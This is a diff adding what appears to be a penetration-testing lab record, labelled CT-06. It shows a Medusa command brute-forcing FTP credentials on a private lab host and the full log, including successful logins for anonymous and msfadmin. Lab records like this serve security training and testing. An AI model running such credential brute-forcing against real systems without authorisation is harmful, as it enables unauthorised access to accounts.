@@ -1,0 +1,42 @@
+=== CT-06: Medusa FTP ===
+CMD: medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-20 01:09:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 0 complete) Password: password (1 of 6 complete)
+2026-11-20 01:09:14 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: anonymous Password: password [SUCCESS]
+2026-11-20 01:09:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 1 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:09:14 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: anonymous Password: msfadmin [SUCCESS]
+2026-11-20 01:09:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 2 complete) Password: admin (3 of 6 complete)
+2026-11-20 01:09:14 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: anonymous Password: admin [SUCCESS]
+2026-11-20 01:09:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 3 complete) Password: 123456 (4 of 6 complete)
+2026-11-20 01:09:14 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: anonymous Password: 123456 [SUCCESS]
+2026-11-20 01:09:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 4 complete) Password: password (1 of 6 complete)
+2026-11-20 01:09:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 4 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:09:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 4 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:09:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 5 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:09:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 5 complete) Password: toor (5 of 6 complete)
+2026-11-20 01:09:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 5 complete) Password: letmeout (6 of 6 complete)
+2026-11-20 01:09:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 5 complete) Password: msfadmin (1 of 6 complete)
+2026-11-20 01:09:20 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-20 01:09:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 6 complete) Password: password (2 of 6 complete)
+2026-11-20 01:09:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 6 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:09:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 6 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:09:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 6 complete) Password: 123456 (1 of 6 complete)
+2026-11-20 01:09:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 6 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:09:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 6 complete) Password: password (3 of 6 complete)
+2026-11-20 01:09:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 7 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:09:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 7 complete) Password: letmeout (5 of 6 complete)
+2026-11-20 01:09:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 7 complete) Password: password (1 of 6 complete)
+2026-11-20 01:09:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 7 complete) Password: toor (6 of 6 complete)
+2026-11-20 01:09:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 7 complete) Password: 123456 (2 of 6 complete)
+2026-11-20 01:09:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 7 complete) Password: msfadmin (3 of 6 complete)
+2026-11-20 01:09:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 8 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:09:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 8 complete) Password: toor (5 of 6 complete)
+2026-11-20 01:09:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 8 complete) Password: letmeout (6 of 6 complete)
+2026-11-20 01:09:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 8 complete) Password: password (1 of 6 complete)
+2026-11-20 01:09:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 8 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:09:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 8 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:09:36 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 9 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:09:36 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 9 complete) Password: toor (5 of 6 complete)
+2026-11-20 01:09:36 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 9 complete) Password: letmeout (6 of 6 complete)
